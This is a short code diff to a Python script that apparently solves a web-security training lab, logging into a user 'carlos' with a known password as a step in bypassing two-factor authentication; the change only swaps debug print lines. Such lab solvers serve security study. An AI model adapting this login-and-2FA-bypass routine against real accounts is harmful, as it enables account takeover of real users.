@@ -10,10 +10,9 @@ def access_carlos_account(s, url):
     print("(+) Logging into Carlos's account and bypassing 2FA verification...")
     login_url = url + "/login"
     login_data = {"username": "carlos", "password": "montoya"}
-    print("login_url", login_url)
-    print("login_data", login_data)
     r = requests.post(login_url, data=login_data,
                       allow_redirects=False, verify=False, proxies=proxies)
+    print("r", r)
     if r.status_code == 200:
         print('Login successful!')
     else:
